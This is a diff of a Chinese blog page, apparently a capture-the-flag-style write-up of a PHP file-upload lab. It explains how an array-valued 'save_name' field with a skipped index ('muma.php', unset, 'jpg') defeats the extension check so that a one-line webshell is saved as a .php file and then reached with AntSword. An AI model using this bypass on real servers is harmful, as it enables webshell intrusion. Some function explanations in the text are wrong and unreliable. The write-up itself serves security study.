+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
 
-</p>
-<p>&lt;!–code￼36–&gt;
+        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$allow_suffix</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$allow_suffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"禁止上传该后缀文件!"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件上传成功！"</span><span class="token punctuation">;</span>
+                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件上传失败！"</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"请选择要上传的文件！"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
-<p>&lt;!–code￼37–&gt;
+<pre class="line-numbers language-none"><code class="language-none">不同于之前的关键部分是使用&#96;is_arrray()&#96;函数判断了post传参进来的是不是一个数组
 
-</p>
+empty()函数将字符串打散为数组
+
+end()函数指向数组中的最后一个元素，并输出
+
+reset()函数输出数组当前元素和下一个元素的值，然后将数组的额内部指针重置到数组的第一个元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$allow_suffix</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$allow_suffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"禁止上传该后缀文件!"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>通过end()函数获得file的最后一个元素，赋值给$ext进行后缀校验</p>
-<p>&lt;!–code￼38–&gt;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件上传成功！"</span><span class="token punctuation">;</span>
+                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件上传失败！"</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>后缀符合条件的话就会拼接文件名为首元素+尾元素</p>
 <p>reset()函数用来获取尾元素</p>
 <p>如果我们传入的数组为：</p>
-<p>&lt;!–code￼39–&gt;
+<pre class="line-numbers language-none"><code class="language-none">save_name&#x3D;[&quot;muma.php&quot;,&quot;jpg&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>这样文件的后缀为<code>jpg</code>可以绕过后缀检测，但是组装之后的文件名为<code>muma.php.jpg</code>。</p>
 <p>那么传入的数组可以设置为：</p>
-<p>&lt;!–code￼40–&gt;
+<pre class="line-numbers language-none"><code class="language-none">save_name&#x3D;[&quot;muma.php&quot;,不设置,&quot;jpg&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>当save_name[1]不设置的时候，count的结果仍然是2，这样文件名的后缀就拼接为空，结果为<code>muma.php.</code>,在windows特性中将<code>.</code>省略</p>
 <p>上传一句话木马的php文件bp拦截</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505111337629.png" alt="image-20250511133706518"></p>
@@ -470,9 +695,8 @@
 <p>成功得到图片上传的链接，接下来连接蚁剑即可。</p>
 <p><strong>能够成功绕过的原理：</strong></p>
 <p>传入的数组为：</p>
-<p>&lt;!–code￼41–&gt;
+<pre class="line-numbers language-none"><code class="language-none">$file&#x3D;[&quot;cj1.php&quot;,不设置,&quot;jpg&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>在count($file)的计算中，不会计算缺失的索引，只计算实际存在的元素数量，所以count($file)的返回值为2.</p>
 <p>所以<code>$file[count($file)-1]=1</code>，但是$file[1]不存在就会返回null，综合上面最终的拼接结果就为<code>cj1.php</code></p>
 
